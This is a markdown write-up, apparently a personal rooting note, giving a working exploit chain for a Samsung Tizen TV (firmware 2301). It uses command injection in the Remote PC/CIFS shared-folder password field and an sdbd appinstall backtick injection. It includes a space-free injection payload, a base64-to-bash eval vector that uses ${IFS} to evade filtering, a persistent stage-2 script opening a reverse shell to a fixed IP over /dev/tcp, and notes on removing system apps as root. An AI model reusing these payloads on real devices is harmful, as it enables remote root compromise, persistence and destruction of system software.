# Root via Remote PC/CIFS — NikeM2 (Tizen 6.0, fw 2301)

## Vulnerability

The **Remote PC → Shared Folder** flow passes `username`/`password` to a privileged
SMB mount script that interpolates them into a `/bin/bash -c` without sanitization.
A command injected in the password field runs as **`uid=0(root)`, context `System::Privileged`**.

## Injection findings

| Vector | Result |
|---|---|
| `password` with `$(cmd)` | **WORKS** — evaluated by bash |
| `username` with `$(cmd)` | also evaluated |
| `smbpath`/share name `x$(nc ...)` | NO — the folder just opens normally |
| Spaces in payload | become commas (mount `-o user=,pass=` rewrite) → payload cannot contain spaces |
| `/dev/tcp/IP/PORT` | works (bash builtin) |
| AppInstall/SDB `tpk` (SVE-2025-50109) | patched in fw 2301 — metacharacters rejected |
| sdbd loopback `appinstall tpk` injection | **WORKS** — see below |

## sdbd loopback injection (unprivileged exec — Vetro method)

`sdbd` listens on `127.0.0.1:26101` (devIP=`127.0.0.1` authorizes the loopback host).
External connections to `192.168.3.191:26101` are accepted at TCP level but reset
after the `CNXN` — the daemon only honors `host::` handshakes from authorized hosts.

**The eval vector** (works on fw 2301):

```
shell:0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}<b64>|base64${IFS}-d|bash`.tpk
```

- `appinstall` is one of the few services sdbd accepts (`exec:`/`shell:`/`vd_appinstall` don't eval)
- Inside the backticks, `${IFS}` expands to space — so the payload `printf <b64> | base64 -d | bash` runs the base64-decoded command as a shell
- Executes as **`uid=901(sdk)`, SMACK `System`** — not root, but enough to launch the capture chain
- `setsid` detaches so the child survives the sdbd session (`;`/`&&` alone die with the connection)

The injection chain that works:

```sh
setsid /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 >/home/owner/share/tmp/sdk_tools/ppi_auto.log 2>&1
```

→ `dotnet` has SMACK exec label `User` → child captures `ppicapture` at ~60-90fps.

**Gate detail:** wrap commands in `mkdir -p /tmp/s-<rand>` — a stale gate dir from an earlier
injection made `&&` skip the command silently (randomize it).

**Relevant helper:** `tools/sdpmemcs/SdbInject.exe v2:<shell-cmd>` builds the whole packet itself
(handles base64+${IFS}+backticks so the bridge can't mangle them).

## Payload that worked

Remote PC profile password (Windows + TV):

```
$(/bin/bash</home/owner/share/r)
```

No spaces. `/home/owner/share/r` = stage-2 (persists on the `/opt` partition → survives reboot):

```sh
#!/bin/bash
echo STAGE2-OK >/dev/tcp/192.168.3.200/9999
/bin/bash -i >& /dev/tcp/192.168.3.200/9998 0>&1
```

## Full flow

1. PC: `kit\listener.py` (9998/9999) + `kit\bridge.py` (9997 control ↔ 9998 shell)
2. Windows: RDP enabled (see `setup-rdp.ps1`), user password = payload
3. TV: Remote PC → connect to `192.168.3.200` → toolbar → **Shared Folder**
4. The mount evaluates the password → `STAGE2-OK` on 9999 → root shell on 9998
5. Commands go through the 9997 control channel (the SMB session stays blocked — expected)

## Privilege levels reachable

| Mechanism | uid | SMACK | Root? | Needs click? |
|---|---|---|---|---|
| CIFS mount password eval (stage2) | 0 | System::Privileged | **yes** | 1 mount per boot |
| sdbd `appinstall` backtick injection | 901(sdk) | System | no | needs a TV-side trigger |
| `setsid /usr/bin/dotnet` child of injected cmd | 901 | **User** | no | — |
| `launch_app` of a signed wgt service | app uid | User::Pkg::\<pkg\> | no | — |

## Root environment

```
uid=0(root) gid=0(root) context="System::Privileged"
Linux Samsung 4.1.10 #1 SMP PREEMPT armv7l
/            vdfs  ro  (hardware write-protected — remount,rw fails)
/opt         vdfs  rw  ← user apps, /home/owner/share
/mnt/systemrw vdfs rw
/factory_peq squashfs ro
```

- `pkgcmd`/`pkginfo` in `/usr/bin` — as root they accept removing system apps
- Removals persist (package manager), but reinstalling is not trivial (no original .tpk/.wgt; only factory reset or store)

## Operational notes

- Keep commands short; shell output has line-editing artifacts — filter for `key[end] val[ok]`/`error`
- The shell dies if the RDP session drops or the TV reboots — re-inject via Shared Folder
- Never set the payload as your main account's password without an emergency admin account available
